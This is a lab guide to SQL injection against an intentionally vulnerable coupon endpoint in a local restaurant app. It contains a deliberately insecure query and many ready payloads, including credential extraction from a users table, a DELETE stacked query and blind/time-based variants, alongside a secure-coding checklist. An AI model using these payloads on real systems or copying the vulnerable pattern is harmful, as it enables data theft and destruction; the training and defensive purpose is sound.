# SQL Injection Practical Guide - Laboratory Environment

## Overview

This guide teaches SQL injection techniques using the intentional vulnerability in the Restaurant Management System's `/lab/billing` endpoint. This is a **controlled training environment** only.

---

## Prerequisites

1. ✅ Enable Lab Mode in `app.py`:
   ```python
   LAB_MODE = True
   ```

2. ✅ Restart application:
   ```bash
   python app.py
   ```

3. ✅ Create test user account and login

4. ✅ Navigate to: `http://localhost:5000/lab/billing`

---

## Understanding the Vulnerable Code

The endpoint contains this vulnerable query:

```python
# ❌ VULNERABLE - Don't use in production!
query = f"SELECT * FROM secret_coupons WHERE coupon_code = '{coupon_code}'"
cursor.execute(query)
```

**Why it's vulnerable:**
- User input (`coupon_code`) is directly inserted into the SQL query
- No parameterized queries used
- No input validation/sanitization
- Attacker can break out of quotes and inject SQL

**Safe alternative:**
```python
# ✅ SAFE - Use this in production
cursor.execute("SELECT * FROM secret_coupons WHERE coupon_code = ?", (coupon_code,))
```

---

## SQL Injection Techniques

### Technique 1: OR-Based Injection

**Purpose:** Return all records by making condition always true

**Payload:**
```
' OR '1'='1' --
```

**How it works:**
```sql
-- Original query:
SELECT * FROM secret_coupons WHERE coupon_code = '[INPUT]'

-- With payload ' OR '1'='1' --:
SELECT * FROM secret_coupons WHERE coupon_code = '' OR '1'='1' --'

-- Simplified (-- comments out the rest):
SELECT * FROM secret_coupons WHERE coupon_code = '' OR '1'='1'

-- Result: '1'='1' is always TRUE, so returns all rows
```

**Step-by-step:**
1. Go to `/lab/billing`
2. Paste in coupon field: `' OR '1'='1' --`
3. Click Apply Coupon
4. Result: Returns all coupons from secret_coupons table

**Output:**
```
Coupon Code: [first coupon in table]
Discount: [percentage]
```

---

### Technique 2: UNION-Based Injection

**Purpose:** Combine results from different tables

**Payload:**
```
' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master WHERE type='table' --
```

**How it works:**
```sql
-- Original query returns 7 columns from secret_coupons:
SELECT * FROM secret_coupons WHERE coupon_code = ''

-- UNION combines with another SELECT (must have same column count):
UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master WHERE type='table'

-- Results:
coupon_code (1) | discount (2) | is_trap (3) | claimed_by (4) | claimed_at (5) | created_at (6) | id (7)
users           | 2            | 3           | 4              | 5              | 6              | 7
orders          | 2            | 3           | 4              | 5              | 6              | 7
secret_coupons  | 2            | 3           | 4              | 5              | 6              | 7
```

**Step-by-step:**
1. Go to `/lab/billing`
2. Paste: `' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master WHERE type='table' --`
3. Click Apply Coupon
4. Result: Lists all database table names

**What you discover:**
- `users` - User account table
- `orders` - Order table
- `secret_coupons` - Hidden table! (Not in UI)
- `sqlite_sequence` - SQLite metadata

---

### Technique 3: Information Schema Enumeration

**Purpose:** Extract table and column information

**Payload 1 - List all tables:**
```
' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master --
```

**Payload 2 - List all columns in a table:**
```
' UNION SELECT sql,2,3,4,5,6,7 FROM sqlite_master WHERE type='table' AND tbl_name='secret_coupons' --
```

**Result shows CREATE TABLE statement:**
```
CREATE TABLE secret_coupons (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    coupon_code TEXT UNIQUE NOT NULL,
    discount_percentage INTEGER DEFAULT 50,
    is_trap INTEGER DEFAULT 1,
    claimed_by TEXT,
    claimed_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
```

**Now you know:**
- All column names
- Data types
- Constraints
- The structure completely!

---

### Technique 4: Targeted Data Extraction

**Purpose:** Extract specific data from hidden table

**Payload:**
```
' UNION SELECT coupon_code,discount_percentage,is_trap,claimed_by,claimed_at,created_at,id FROM secret_coupons --
```

**Step-by-step:**
1. Go to `/lab/billing`
2. Paste the payload
3. Click Apply Coupon
4. Result: All data from secret_coupons table

**What you get:**
```
Coupon Code: TRAP_SQLI_EXPLOIT
Discount: 99
Is_trap: 1
Claimed_by: [null or username]
Claimed_at: [timestamp]
Created_at: [timestamp]
```

**You've discovered:**
- The trap coupon code: `TRAP_SQLI_EXPLOIT`
- It has 99% discount
- It's marked as a trap (is_trap=1)
- When/if it was claimed

---

### Technique 5: Exploit Detection Trigger

**Purpose:** Successfully exploit and get caught (trap detection)

**Payload:**
```
TRAP_SQLI_EXPLOIT
```

**Step-by-step:**
1. Go to `/lab/billing`
2. Enter simple text: `TRAP_SQLI_EXPLOIT`
3. Click Apply Coupon
4. Result: Warning appears!

**What happens:**
```
🚨 SECURITY ALERT: Trap coupon detected! This incident has been logged.
Discount: 99%
This security trap indicates an attempt to exploit the SQL injection vulnerability.
Your actions are being logged and reviewed.
```

**Behind the scenes:**
- System detects is_trap=1
- Logs alert type: `SQLI_EXPLOITER`
- Records your username
- Records IP address
- Records timestamp
- Updates database with claimed_by=YOUR_USERNAME

**Check the logs:**
```bash
grep "SQLI_EXPLOITER" logs/security_alerts.log
```

Output:
```
2025-02-07 14:32:15 - ALERT - Type: SQLI_EXPLOITER | IP: 127.0.0.1 | Details: User testuser claimed trap coupon: TRAP_SQLI_EXPLOIT - Likely SQL injection exploitation
```

---

## Attack Flow Walkthrough

### Step 1: Reconnaissance

**Goal:** Understand database structure

**Payloads to try:**
1. `' OR '1'='1' --` → See what data exists
2. `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --` → Determine column count
3. `' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master --` → Map database

---

### Step 2: Discovery

**Goal:** Find interesting hidden tables

**Payload:**
```
' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master WHERE type='table' --
```

**Result:** Find `secret_coupons` table (hidden from UI)

---

### Step 3: Schema Extraction

**Goal:** Understand secret table structure

**Payload:**
```
' UNION SELECT sql,2,3,4,5,6,7 FROM sqlite_master WHERE type='table' AND tbl_name='secret_coupons' --
```

**Result:** See exact table definition

---

### Step 4: Data Extraction

**Goal:** Get the secret data

**Payload:**
```
' UNION SELECT coupon_code,discount_percentage,is_trap,claimed_by,claimed_at,created_at,id FROM secret_coupons --
```

**Result:** Find `TRAP_SQLI_EXPLOIT` coupon

---

### Step 5: Exploitation

**Goal:** Use the discovered data

**Payload:**
```
TRAP_SQLI_EXPLOIT
```

**Result:** 
- Get caught! ⚠️
- Trigger trap detection
- Logged as SQLI_EXPLOITER
- Appear on admin dashboard

---

## Advanced Techniques

### Technique: Comment Removal/Manipulation

SQLite uses `--` for comments

**Variations:**
```
' OR '1'='1' --          (comment out rest)
' OR '1'='1' /**/        (block comment)
' OR '1'='1' %23         (URL encoded #)
' OR '1'='1' ';--        (escape with semicolon)
```

---

### Technique: Boolean-Based Blind SQL Injection

If output is hidden, use conditional logic:

**Payload:**
```
' AND 1=1 --             (True → observe result)
' AND 1=2 --             (False → observe different result)
```

**Use case:** When you don't see query results but can see differences in behavior

---

### Technique: Time-Based Blind SQL Injection

Make database sleep and observe timing:

**Payload (SQLite):**
```
' AND CASE WHEN 1=1 THEN sqlite3_sleep(5) ELSE 0 END --
```

**Use case:** When no output is visible at all, but you can measure response time

---

### Technique: Stacked Queries

Execute multiple SQL statements:

**Payload:**
```
'; DELETE FROM orders; --
```

**Result:** 
- First query executes
- Then DELETE executes
- Database could be damaged

**Note:** SQLite in Python doesn't support stacked queries by default, but important to understand!

---

## Common Payload Variations

Try these in the coupon field:

### Test 1: Simple String Escape
```
'
```
Result: Error or unexpected behavior shows vulnerability

### Test 2: OR Always True
```
' OR '1'='1
' OR 1=1 --
' OR 'a'='a
admin' --
```

### Test 3: UNION Injection
```
' UNION SELECT 1 --
' UNION SELECT 1,2 --
' UNION SELECT 1,2,3,4,5,6,7 --
```

### Test 4: Database Functions
```
' UNION SELECT @@version --
' UNION SELECT user() --
' UNION SELECT database() --
```

### Test 5: Extract Data
```
' UNION SELECT username,password,3,4,5,6,7 FROM users --
' UNION SELECT item,quantity,3,4,5,6,7 FROM orders --
```

---

## Understanding Error Messages

### Scenario 1: Column Count Mismatch
**Error:** "UNION select: expected X columns, got Y"
**Meaning:** Wrong number of columns in UNION query
**Solution:** Adjust column count: `SELECT 1,2,3,4,5,6 --`

### Scenario 2: Syntax Error
**Error:** SQL syntax error
**Meaning:** Quotes not balanced or invalid SQL
**Solution:** Check for matching quotes and proper syntax

### Scenario 3: Type Mismatch
**Error:** Type incompatibility
**Meaning:** Mixing string with number
**Solution:** Use CAST or SELECT appropriate types

---

## Defense Mechanisms in This App

### What Protects Other Routes

**Safe routes use parameterized queries:**
```python
# ❌ Vulnerable pattern (DON'T USE):
query = f"SELECT * FROM users WHERE username = '{username}'"

# ✅ Safe pattern (USE THIS):
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

**Why it works:**
- Input is never concatenated into SQL
- SQL structure is fixed before user input
- User input treated as data, not code

---

## SQL Injection Prevention Checklist

For developers, never do this:

- ❌ String concatenation: `f"SELECT * WHERE id = {user_input}"`
- ❌ String formatting: `"SELECT * WHERE id = %s" % user_input`
- ❌ String replacement: `query.replace("{id}", user_input)`
- ❌ Manually escaping: `query = query.replace("'", "\\'")` 

Always do this:

- ✅ Parameterized queries: `cursor.execute("... WHERE id = ?", (user_input,))`
- ✅ ORM frameworks: Use SQLAlchemy, Django ORM
- ✅ Input validation: Whitelist acceptable values
- ✅ Least privilege: DB user has minimal permissions
- ✅ Prepared statements: Use vendor-specific solutions

---

## Real-World Impact

### What SQL Injection Can Achieve

1. **Data Theft**
   - Extract user credentials
   - Steal customer data
   - Access financial records

2. **Unauthorized Modifications**
   - Change prices
   - Create fake orders
   - Modify user permissions

3. **Privilege Escalation**
   - Become admin user
   - Elevate permissions
   - Bypass authentication

4. **Denial of Service**
   - Delete critical data
   - Drop tables
   - Corrupt database

5. **System Takeover**
   - Execute OS commands (if enabled)
   - Install backdoors
   - Full server compromise

---

## Why This Training Matters

**SQL Injection is:**
- ✅ Still #1 OWASP vulnerability
- ✅ Easy to exploit if vulnerable
- ✅ Devastating in impact
- ✅ Preventable with proper coding
- ✅ Important to understand

**By learning this:**
- You understand attack vectors
- You write better code
- You catch vulnerabilities
- You secure applications
- You protect user data

---

## After Your Training

**Remember:**
1. ✅ This is an authorized lab environment only
2. ✅ Only for learning and educational purposes
3. ✅ Never exploit systems you don't own
4. ✅ Always get permission before testing
5. ✅ Use this knowledge to build secure applications
6. ✅ Disable LAB_MODE before production deployment

---

## Next Steps

1. **Practice different payloads** in the lab
2. **Review the logs** to see detection
3. **Study the secure code** in production routes
4. **Understand the difference** between safe and unsafe
5. **Build secure applications** using parameterized queries
6. **Train yourself** to always use safe patterns
7. **Share knowledge** with your team

---

## Cheatsheet

```
Basic OR Injection:
' OR '1'='1' --

UNION Injection (List tables):
' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master --

Extract Data:
' UNION SELECT coupon_code,discount_percentage,is_trap FROM secret_coupons --

Trigger Trap:
TRAP_SQLI_EXPLOIT

View Logs:
grep SQLI_EXPLOITER logs/security_alerts.log

Admin Dashboard:
/admin/exploiters
```

---

## Questions?

- Check: `COMPLETE_TESTING_GUIDE.md` for full testing workflows
- Check: `LAB_SECURITY_ARCHITECTURE.md` for technical details
- Check: `LAB_MODE_SETUP.md` for configuration
- Review: `app.py` lines 485-492 for vulnerable code
- Study: Parameterized queries in other routes
